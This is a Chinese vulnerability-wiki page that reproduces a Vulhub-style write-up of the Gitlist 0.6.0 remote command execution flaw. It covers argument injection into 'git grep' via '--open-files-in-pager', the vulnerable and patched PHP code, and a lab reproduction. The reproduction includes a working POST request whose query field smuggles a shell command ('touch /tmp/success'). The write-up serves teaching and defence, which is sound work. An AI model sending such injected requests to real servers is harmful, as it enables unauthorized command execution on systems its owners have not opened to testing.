<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Gitlist/Gitlist%200.6.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Gitlist 0.6.0 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Gitlist 0.6.0 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_7" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../0.6.0-rce/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../0.6.0-rce/" class="btn btn-xs btn-link">
        redirect to gitlist/CVE-2018-1000533
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Gitlab/CVE-2021-22205/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Gitlab/CVE-2021-22205/README.zh-cn/" class="btn btn-xs btn-link">
        GitLab 远程命令执行漏洞（CVE-2021-22205）
      </a>
    </div>
    
  </div>

    

    <h1 id="gitlist-060">Gitlist 0.6.0 远程命令执行漏洞<a class="headerlink" href="#gitlist-060" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Gitlist 0.6.0</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>执行如下命令启动漏洞环境：</p>
<div class="codehilite"><pre><span></span><code>docker-compose up -d
</code></pre></div>

<p>环境启动后，访问<code>http://your-ip:8080</code>将看到一个名为<code>example</code>的仓库。</p>
<h3 id="_5">漏洞分析<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>在用户对仓库中代码进行搜索的时候，gitlist将调用<code>git grep</code>命令：</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">searchTree</span><span class="p">(</span><span class="err">$</span><span class="n">query</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">branch</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">query</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kr">return</span><span class="w"> </span><span class="n">null</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="err">$</span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">escapeshellarg</span><span class="p">(</span><span class="err">$</span><span class="n">query</span><span class="p">);</span>

<span class="w">    </span><span class="n">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">$</span><span class="n">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">getClient</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">run</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;grep -i --line-number {$query} $branch&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="err">\</span><span class="n">RuntimeException</span><span class="w"> </span><span class="err">$</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kr">return</span><span class="w"> </span><span class="kr">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>其中，<code>$query</code>是搜索的关键字，<code>$branch</code>是搜索的分支。</p>
<p>如果用户输入的<code>$query</code>的值是<code>--open-files-in-pager=id;</code>，将可以执行<code>id</code>命令：1.png导致这个漏洞的原因，有几点：</p>
<ol>
<li>
<p>开发者对于<code>escapeshellarg</code>函数的误解，造成参数注入</p>
</li>
<li>
<p><code>git grep</code>的参数<code>--open-files-in-pager</code>的值，将被直接执行</p>
</li>
</ol>
<p>理论上，在经过<code>$query = escapeshellarg($query);</code>处理后，<code>$query</code>将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在"参数值"的位置，而不是出现在参数选项（option）中。</p>
<p>我们可以试一下如下命令：</p>
<div class="codehilite"><pre><span></span><code>git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master
</code></pre></div>

<p>2.png如上图，我将<code>$query</code>放在了<code>-e</code>参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数<code>--open-files-in-pager</code>。</p>
<p>这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）：</p>
<blockquote>
<p>-e The next parameter is the pattern. This option has to be used for
patterns starting with - and should be used in scripts passing user
input to grep. Multiple patterns are combined by or.</p>
</blockquote>
<p>当然，gitlist的开发者用了另一种修复方案：</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">searchTree</span><span class="p">(</span><span class="n">$query</span><span class="p">,</span><span class="w"> </span><span class="n">$branch</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="n">$query</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">null</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">$query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">preg_replace</span><span class="p">(&#39;</span><span class="o">/</span><span class="p">(</span><span class="o">--?</span><span class="p">[</span><span class="n">A</span><span class="o">-</span><span class="n">Za</span><span class="o">-</span><span class="n">z0</span><span class="o">-</span><span class="mh">9</span><span class="n">\-]+)/&#39;,</span><span class="w"> </span><span class="p">&#39;&#39;,</span><span class="w"> </span><span class="n">$query</span><span class="p">);</span>
<span class="w">    </span><span class="n">$query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">escapeshellarg</span><span class="p">(</span><span class="n">$query</span><span class="p">);</span>
<span class="w">    </span><span class="n">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">$results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">getClient</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">run</span><span class="p">(</span><span class="n">$this</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;grep -i --line-number -- {$query} $branch&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">\RuntimeException</span><span class="w"> </span><span class="n">$e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>首先用<code>preg_replace</code>将<code>-</code>开头的非法字符移除，然后将<code>$query</code>放在<code>--</code>的后面。在命令行解析器中，<code>--</code>的意思是，此后的部分不会再包含参数选项（option）：</p>
<blockquote>
<p>A -- signals the end of options and disables further option
processing. Any arguments after the -- are treated as filenames and
arguments. An argument of - is equivalent to --.</p>
<p>If arguments remain after option processing, and neither the -c nor
the -s option has been supplied, the first argument is assumed to be
the name of a file containing shell commands. If bash is invoked in
this fashion, $0 is set to the name of the file, and the positional
parameters are set to the remaining arguments. Bash reads and executes
commands from this file, then exits. Bash\'s exit status is the exit
status of the last command executed in the script. If no commands are
executed, the exit status is 0. An attempt is first made to open the
file in the current directory, and, if no file is found, then the
shell searches the directories in PATH for the script.</p>
</blockquote>
<p>举个简单的例子，如果我们需要查看一个文件名是<code>--name</code>的文件，我们就不能用<code>cat --name</code>来读取，也不能用<code>cat '--name'</code>，而必须要用<code>cat -- --name</code>。从这个例子也能看出，单引号并不是区分一个字符串是"参数值"或"选项"的标准。3.png所以官方这个修复方案也是可以接受的，只不过第一步的preg_replace有点影响正常搜索功能。</p>
<h3 id="_6">漏洞复现<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p>发送如下数据包：</p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/example/tree/a/search</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org:8080</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">56</span>

<span class="nt">query</span><span class="o">=</span><span class="s">--open-files-in-pager</span><span class="o">=</span><span class="s">touch /tmp/success;</span>
</code></pre></div>

<p>其中，我们访问的是<code>/example/tree/a/search</code>，example是项目名称，需要是目标gitlist上一个已存在的项目；a在正常情况下应该是分支的名称，也就是<code>"grep -i --line-number {$query} $branch"</code>中的<code>$branch</code>，但因为我们的<code>$query</code>被当成了一个参数，所以<code>$branch</code>就应该被当做搜索的关键字。</p>
<p>如果没有搜索结果的话，我们的命令是不会被执行的，所以我用了"a"这个关键字，只是为了保证能搜出结果，你也可以换成其他的试试。</p>
<p>数据包发送后，用<code>docker-compose exec web bash</code>进入容器中，可见<code>/tmp/success</code>已成功创建：4.png</p>
<h2 id="_7">参考链接<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://vulhub.org/">https://vulhub.org/</a>#/environments/gitlist/0.6.0-rce/</p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../0.6.0-rce/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../0.6.0-rce/" class="btn btn-xs btn-link">
        redirect to gitlist/CVE-2018-1000533
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Gitlab/CVE-2021-22205/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Gitlab/CVE-2021-22205/README.zh-cn/" class="btn btn-xs btn-link">
        GitLab 远程命令执行漏洞（CVE-2021-22205）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>